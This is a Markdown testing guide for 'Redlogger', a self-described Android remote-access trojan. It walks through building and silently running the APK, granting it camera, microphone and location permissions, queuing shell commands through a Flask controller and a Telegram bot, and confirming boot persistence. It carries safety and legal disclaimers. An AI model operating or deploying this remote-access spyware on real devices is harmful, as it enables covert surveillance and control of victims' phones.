# Redlogger Testing Guide

This guide provides comprehensive instructions for testing the Redlogger Android RAT in safe, controlled environments.

## 🧪 Testing Environment Setup

### Virtual Testing Environment

**Recommended Setup:**
- Host OS: Ubuntu 22.04 LTS (VM or physical)
- Android Emulator: Android Studio AVD
- Network: Isolated test network
- Controller: Local Flask server

### Android Emulator Configuration

1. **Install Android Studio:**
   ```bash
   # Download Android Studio
   wget https://redirector.gvt1.com/edgedl/android/studio/ide-zips/2023.1.1.28/android-studio-2023.1.1.28-linux.tar.gz
   
   # Extract and install
   tar -xzf android-studio-*.tar.gz
   sudo mv android-studio /opt/
   /opt/android-studio/bin/studio.sh
   ```

2. **Create Test AVD:**
   ```bash
   # Create AVD with API 27 (Android 8.1)
   avdmanager create avd -n redlogger_test -k "system-images;android-27;google_apis;x86_64"
   
   # Start emulator
   emulator -avd redlogger_test -no-snapshot-save
   ```

3. **Configure Emulator for Testing:**
   ```bash
   # Enable developer options
   adb shell settings put global development_settings_enabled 1
   
   # Enable USB debugging
   adb shell settings put global adb_enabled 1
   
   # Disable screen lock
   adb shell settings put secure lockscreen.disabled 1
   ```

## 🔧 Pre-Testing Configuration

### Environment Variables

Create a test configuration file:

```bash
# test_config.env
export TELEGRAM_BOT_TOKEN="123456789:ABCdefGHIjklMNOpqrsTUVwxyz"
export TELEGRAM_CHAT_ID="987654321"
export NOIP_URL="http://localhost:5000"
export FLASK_ENV="development"
export FLASK_DEBUG="1"
```

Load the configuration:
```bash
source test_config.env
```

### Test Database Setup

```bash
# Create test database directory
mkdir -p test_data/database

# Set test database path
export DATABASE_PATH="test_data/database/redlogger_test.db"
```

## 📱 APK Testing Procedures

### 1. Build Verification

```bash
# Navigate to client directory
cd redlogger_client

# Clean previous builds
buildozer android clean

# Build debug APK
buildozer android debug

# Verify APK creation
ls -la bin/
file bin/redlogger-0.1-debug.apk
```

### 2. APK Analysis

```bash
# Install APK analysis tools
pip install apktools

# Extract APK contents
mkdir apk_analysis
cd apk_analysis
unzip ../bin/redlogger-0.1-debug.apk

# Analyze manifest
cat AndroidManifest.xml | grep -E "(permission|service|receiver)"

# Check for suspicious strings
strings classes.dex | grep -E "(http|telegram|shell|exec)"
```

### 3. Installation Testing

```bash
# Install APK on emulator
adb install bin/redlogger-0.1-debug.apk

# Verify installation
adb shell pm list packages | grep redlogger

# Check app info
adb shell dumpsys package org.redlogger.redlogger
```

### 4. Permission Testing

```bash
# Check requested permissions
adb shell dumpsys package org.redlogger.redlogger | grep permission

# Grant permissions manually (for testing)
adb shell pm grant org.redlogger.redlogger android.permission.CAMERA
adb shell pm grant org.redlogger.redlogger android.permission.RECORD_AUDIO
adb shell pm grant org.redlogger.redlogger android.permission.READ_EXTERNAL_STORAGE
adb shell pm grant org.redlogger.redlogger android.permission.WRITE_EXTERNAL_STORAGE
adb shell pm grant org.redlogger.redlogger android.permission.ACCESS_FINE_LOCATION
```

## 🎛️ Controller Testing

### 1. Local Controller Setup

```bash
# Start controller in test mode
cd controller/redlogger_controller
source venv/bin/activate
python src/main.py
```

### 2. API Endpoint Testing

```bash
# Test device registration endpoint
curl -X POST http://localhost:5000/api/data \
  -H "Content-Type: application/json" \
  -d '{
    "device_id": "test_device_001",
    "imei": "123456789012345",
    "android_version": "8.1.0",
    "manufacturer": "Google",
    "model": "Android SDK built for x86_64"
  }'

# Test device listing
curl http://localhost:5000/api/devices

# Test command queuing
curl -X POST http://localhost:5000/api/commands \
  -H "Content-Type: application/json" \
  -d '{
    "device_id": "test_device_001",
    "command": "shell:whoami"
  }'

# Test command retrieval
curl http://localhost:5000/api/commands/test_device_001
```

### 3. Web Interface Testing

```bash
# Test web interface accessibility
curl -I http://localhost:5000/

# Test static file serving
curl http://localhost:5000/static/index.html

# Test API endpoints from browser
# Open http://localhost:5000 in browser
```

## 🤖 Telegram Bot Testing

### 1. Bot Setup Verification

```bash
# Test bot token
curl "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe"

# Test webhook info
curl "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getWebhookInfo"

# Send test message
curl -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
  -d "chat_id=${TELEGRAM_CHAT_ID}" \
  -d "text=Redlogger test message"
```

### 2. Bot Command Testing

Test each bot command:

```
/start
/devices
/logs test_device_001
/cmd test_device_001 whoami
/audio test_device_001 5
/photo test_device_001
/files test_device_001 /sdcard
```

### 3. Bot Response Validation

Monitor bot responses and verify:
- Command acknowledgment
- Error handling
- Data formatting
- Response timing

## 🔄 End-to-End Testing

### 1. Complete Workflow Test

```bash
# 1. Start controller
cd controller/redlogger_controller
python src/main.py &
CONTROLLER_PID=$!

# 2. Install and start client
adb install redlogger_client/bin/redlogger-0.1-debug.apk
adb shell am start -n org.redlogger.redlogger/.MainActivity

# 3. Wait for initial connection
sleep 30

# 4. Test device registration
curl http://localhost:5000/api/devices | jq '.'

# 5. Send test commands via API
curl -X POST http://localhost:5000/api/commands \
  -H "Content-Type: application/json" \
  -d '{"device_id": "test_device", "command": "shell:date"}'

# 6. Verify command execution
sleep 10
curl http://localhost:5000/api/commands/test_device | jq '.'

# 7. Clean up
kill $CONTROLLER_PID
adb uninstall org.redlogger.redlogger
```

### 2. Data Collection Testing

```bash
# Test data collection endpoints
adb shell am broadcast -a android.intent.action.BATTERY_CHANGED
adb shell am broadcast -a android.intent.action.BOOT_COMPLETED

# Monitor logcat for client activity
adb logcat | grep -i redlogger
```

### 3. Network Communication Testing

```bash
# Monitor network traffic
adb shell tcpdump -i any -w /sdcard/redlogger_traffic.pcap &

# Generate test traffic
# Send commands via Telegram bot
# Send commands via web interface

# Stop capture and analyze
adb shell killall tcpdump
adb pull /sdcard/redlogger_traffic.pcap
wireshark redlogger_traffic.pcap
```

## 🔍 Security Testing

### 1. Static Analysis

```bash
# Install security analysis tools
pip install bandit safety

# Run security scan on Python code
bandit -r controller/redlogger_controller/src/

# Check for known vulnerabilities
safety check -r controller/redlogger_controller/requirements.txt

# Analyze APK with MobSF (if available)
# Upload APK to local MobSF instance
```

### 2. Dynamic Analysis

```bash
# Monitor file system access
adb shell strace -p $(adb shell pidof org.redlogger.redlogger) -e trace=file

# Monitor network connections
adb shell netstat -an | grep $(adb shell pidof org.redlogger.redlogger)

# Monitor system calls
adb shell strace -p $(adb shell pidof org.redlogger.redlogger) -e trace=network
```

### 3. Privacy Testing

```bash
# Check data collection
adb shell dumpsys package org.redlogger.redlogger | grep -A 10 "permissions:"

# Monitor sensitive API calls
adb logcat | grep -E "(location|camera|microphone|contacts|sms)"

# Verify data encryption (if implemented)
adb shell cat /data/data/org.redlogger.redlogger/files/ | strings
```

## 📊 Performance Testing

### 1. Resource Usage

```bash
# Monitor CPU usage
adb shell top | grep redlogger

# Monitor memory usage
adb shell dumpsys meminfo org.redlogger.redlogger

# Monitor battery usage
adb shell dumpsys batterystats | grep redlogger

# Monitor network usage
adb shell cat /proc/net/dev
```

### 2. Stress Testing

```bash
# Send multiple commands rapidly
for i in {1..100}; do
  curl -X POST http://localhost:5000/api/commands \
    -H "Content-Type: application/json" \
    -d "{\"device_id\": \"test_device\", \"command\": \"shell:echo test_$i\"}"
  sleep 0.1
done

# Monitor system stability
adb shell dmesg | tail -50
```

### 3. Persistence Testing

```bash
# Test boot persistence
adb reboot

# Wait for boot completion
adb wait-for-device

# Check if service started
adb shell ps | grep redlogger

# Verify auto-start functionality
adb shell dumpsys activity services | grep redlogger
```

## 🧹 Cleanup and Reset

### 1. Test Environment Cleanup

```bash
# Stop all processes
pkill -f "python.*redlogger"
pkill -f "emulator"

# Remove test APK
adb uninstall org.redlogger.redlogger

# Clean test data
rm -rf test_data/
rm -f redlogger_traffic.pcap

# Reset emulator
emulator -avd redlogger_test -wipe-data
```

### 2. Database Reset

```bash
# Backup test results
cp controller/redlogger_controller/src/database/redlogger.db test_results_$(date +%Y%m%d_%H%M%S).db

# Reset database
rm controller/redlogger_controller/src/database/redlogger.db

# Restart controller to recreate database
cd controller/redlogger_controller
python src/main.py
```

## 📋 Test Checklist

### Pre-Testing
- [ ] Virtual environment set up
- [ ] Android emulator configured
- [ ] Test configuration loaded
- [ ] Network isolation verified

### APK Testing
- [ ] APK builds successfully
- [ ] APK installs without errors
- [ ] Permissions granted correctly
- [ ] App starts and runs silently

### Controller Testing
- [ ] Flask server starts successfully
- [ ] Web interface accessible
- [ ] API endpoints respond correctly
- [ ] Database operations work

### Telegram Bot Testing
- [ ] Bot token valid
- [ ] Bot responds to commands
- [ ] Commands execute correctly
- [ ] Error handling works

### Integration Testing
- [ ] Client connects to controller
- [ ] Commands sent and received
- [ ] Data collection works
- [ ] File operations successful

### Security Testing
- [ ] No hardcoded credentials
- [ ] Proper permission handling
- [ ] Network traffic encrypted (if applicable)
- [ ] No sensitive data leakage

### Performance Testing
- [ ] Acceptable resource usage
- [ ] Stable under load
- [ ] Boot persistence works
- [ ] No memory leaks

### Cleanup
- [ ] Test environment cleaned
- [ ] APK uninstalled
- [ ] Test data removed
- [ ] Documentation updated

## 🚨 Safety Guidelines

### Testing Boundaries

1. **Only test on owned devices or authorized test environments**
2. **Use isolated networks to prevent accidental exposure**
3. **Document all testing activities for audit purposes**
4. **Remove all test installations after completion**
5. **Report any security vulnerabilities found**

### Emergency Procedures

If testing reveals security issues:

1. **Immediately stop all testing**
2. **Document the issue thoroughly**
3. **Isolate affected systems**
4. **Report to project maintainers**
5. **Do not disclose publicly until fixed**

### Legal Compliance

- Ensure testing complies with local laws
- Obtain proper authorization for all testing
- Respect privacy and data protection regulations
- Maintain confidentiality of test results

---

**Remember:** This testing guide is for educational and authorized security testing only. Always follow responsible disclosure practices and respect legal boundaries.

